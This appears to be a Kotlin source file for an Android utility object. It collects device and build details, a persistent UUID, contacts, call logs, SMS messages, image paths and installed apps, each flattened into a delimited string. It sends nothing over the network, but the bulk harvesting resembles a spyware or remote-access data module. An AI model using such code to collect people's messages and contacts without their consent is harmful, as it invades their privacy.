import android.Manifest
import android.app.Activity
import android.content.Context
import android.os.Build
import java.util.*
import android.content.ContentResolver
import android.content.pm.PackageManager
import android.database.Cursor
import android.net.Uri
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import android.util.Log
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import java.text.SimpleDateFormat
import android.content.pm.ResolveInfo
import android.content.Intent

object SystemDetails {
    // Function to get system details
    fun getSystemDetails(context: Context): String {
        // Construct system details string by retrieving Phone details using Build class properties
        val model = "Model: ${Build.MODEL}, " // Get device model
        val id = "ID: ${Build.ID}, " // Get device id
        val manufacturer = "Manufacturer: ${Build.MANUFACTURER}, " // Get device manufacturer
        val brand = "Brand: ${Build.BRAND}, " // Get device brand
        val type = "Type: ${Build.TYPE}, " // Get device type
        val user = "User: ${Build.USER}, " // Get device username
        val base = "Base: ${Build.VERSION_CODES.BASE}, " // Get device base version
        val incremental = "Incremental: ${Build.VERSION.INCREMENTAL}, " // Get device incremental version
        val sdk = "SDK: ${Build.VERSION.SDK}, " // Get device SDK version
        val board = "Board: ${Build.BOARD}, " // Get device board
        val host = "Host: ${Build.HOST}, " // Get device host
        val fingerprint = "Fingerprint: ${Build.FINGERPRINT}, " // Get device fingerprint
        val versionName = "Version Name: ${Build.VERSION_CODES::class.java.fields[Build.VERSION.SDK_INT].name}, " // Get version name
        val versionCode = "Version Code: ${Build.VERSION.RELEASE}" // Get version code
        // Return concatenated system details string
        return "$model$id$manufacturer$brand$type$user$base$incremental$sdk$board$host$fingerprint$versionName$versionCode"
    }
    // Function to get or generate a unique device UUID
    fun getUUID(context: Context): String {
        // Retrieve or generate UUID using SharedPreferences
        val uuid = getDeviceUUID(context)
        val uuidString = "UUID: $uuid" // Construct UUID string and then return it

        return uuidString

    }
    // Function to retrieve or generate device UUID
    private fun getDeviceUUID(context: Context): String {
        val sharedPrefs = context.getSharedPreferences("MyPrefs", Context.MODE_PRIVATE)
        var uuid = sharedPrefs.getString("uuid", null)
        // Generate UUID if not found in SharedPreferences
        if (uuid == null) {
            uuid = UUID.randomUUID().toString() // Generate UUID
            sharedPrefs.edit().putString("uuid", uuid).apply() // Save UUID in SharedPreferences
        }
        return uuid
    }
    // Function to retrieve contact list
    fun getContactList(context: Context): String {
        // Request permission if not granted
        if (ContextCompat.checkSelfPermission(
                context,
                Manifest.permission.READ_CONTACTS
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            ActivityCompat.requestPermissions(
                context as Activity,
                arrayOf(Manifest.permission.READ_CONTACTS),
                0
            ) // Request permission to read contacts
        }
        // Retrieve contact list using ContactsContract
        val contentResolver: ContentResolver = context.contentResolver
        val uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI
        val cursor = contentResolver.query(uri, null, null, null, null) // Query contacts
        val contactList = StringBuilder()
        // Loop through the cursor to extract contact information
        if (cursor?.count ?: 0 > 0) {
            cursor?.let {
                while (it.moveToNext()) {
                    val contactName =
                        it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                    val contactNumber =
                        it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
                    // Use contactName and contactNumber as needed
                    val contactInfo = "ContactName:$contactName ContactNumber:$contactNumber | "
                    contactList.append(contactInfo)
                }
                }
            }
        cursor?.close() // Close cursor
        return contactList.toString() // Return contact list as string
    }
    // Function to retrieve call logs
    fun getCallLogs(context: Context): String {
        // Request permission if not granted
        if (ContextCompat.checkSelfPermission(
                context,
                Manifest.permission.READ_CALL_LOG
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            ActivityCompat.requestPermissions(
                context as Activity,
                arrayOf(Manifest.permission.READ_CALL_LOG),
                0
            ) // Request permission to read call logs
            return "" // Return an empty string if permission is not granted
        }
        // Retrieve call logs using CallLog content provider
        val contentResolver: ContentResolver = context.contentResolver
        val uriCallLogs: Uri = Uri.parse("content://call_log/calls")
        val cursorCallLogs = contentResolver.query(uriCallLogs, null, null, null, null)
        val calllogs = StringBuilder()
        // Looping through the call logs using cursor as marker
        cursorCallLogs?.use { cursor ->
            if (cursor.count > 0) {
                while (cursor.moveToNext()) {
                    val stringNumber: String = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER))
                    var stringName: String = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME))
                    val stringDuration: String = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION))
                    if (stringName.isEmpty()) {
                        stringName = "NULL"
                    }
                    // Append call log information to calllogs
                    val stringOutput =
                        "Duration:$stringDuration Number:$stringNumber Name:$stringName | "
                    calllogs.append(stringOutput)
                }
            }
        }

        cursorCallLogs?.close()
        return calllogs.toString()
    }
    // Data class to represent an SMS message
    data class SMSMessage(
        val message: String,
        val sender: String,
        val date: String,
    )
    // Function to retrieve list of images
    fun listOfImages(context: Context): ArrayList<String> {
        val uri: Uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        val cursor: Cursor?
        val column_index_data: Int
        val listOfAllImages: ArrayList<String> = ArrayList()
        var absolutePathOfImage: String

        val projection = arrayOf(MediaStore.MediaColumns.DATA, MediaStore.Images.Media.BUCKET_DISPLAY_NAME)
        val orderBy = MediaStore.Images.Media.DATE_TAKEN + " DESC"

        cursor = context.contentResolver.query(uri, projection, null, null, orderBy)

        cursor?.apply {
            column_index_data = getColumnIndexOrThrow(MediaStore.MediaColumns.DATA)

            while (moveToNext()) {
                absolutePathOfImage = getString(column_index_data)
                listOfAllImages.add(absolutePathOfImage)
            }

            close()
        }

        return listOfAllImages
    }
    // Function to format date from milliseconds
    fun Long.parsedDate(): String {
        val date = Date(this)
        val format = SimpleDateFormat("dd/MMM/yyyy HH:mm", Locale.getDefault())
        return format.format(date)
    }
    // Function to read SMS messages
    fun readMessages(context: Context, type:String): List<SMSMessage>{
        val messages = mutableListOf<SMSMessage>()
        val cursor = context.contentResolver.query(
            Uri.parse("content://sms/$type"),
            null,
            null,
            null,
            null,
        )
        cursor?.use {
            val indexMessage = it.getColumnIndex("body")
            val indexSender = it.getColumnIndex("address")
            val indexDate = it.getColumnIndex("date")

            while (it.moveToNext()) {
                messages.add(
                    SMSMessage(
                        sender = it.getString(indexSender),
                        message = it.getString(indexMessage),
                        date = it.getLong(indexDate).parsedDate()
                    )
                )
            }
        }
        return messages
    }
    // Function to format SMS messages for display
    fun formatSMSMessages(messages: List<SMSMessage>): String {
        val stringBuilder = StringBuilder()
        var previousSender: String? = null
        for ((index, message) in messages.withIndex()) {
            if (index > 0 && message.sender == previousSender) {
                stringBuilder.append("Message:${message.message} ")
                stringBuilder.append("Date:${message.date} ")
            } else {
                if (index > 0) {
                    stringBuilder.append("| ") // Add separator between different senders
                }
                stringBuilder.append("(Sender:${message.sender}) ")
                stringBuilder.append("Message:${message.message} ")
                stringBuilder.append("Date:${message.date} ")
            }
            previousSender = message.sender
        }
        return stringBuilder.toString()
    }
    // Function to retrieve installed apps
    fun installedApps(context: Context): String {
        val packageManager = context.packageManager
        val mainIntent = Intent(Intent.ACTION_MAIN, null)
        mainIntent.addCategory(Intent.CATEGORY_LAUNCHER)
        val resolveInfos: List<ResolveInfo> = packageManager.queryIntentActivities(mainIntent, 0)

        val appNames = StringBuilder()
        for (resolveInfo in resolveInfos) {
            val appName = resolveInfo.loadLabel(packageManager).toString()
            appNames.append("$appName, ")
        }
        // Remove the trailing ", " if there are any app names
        if (appNames.isNotEmpty()) {
            appNames.delete(appNames.length - 2, appNames.length)
        }
        return appNames.toString()
    }

}
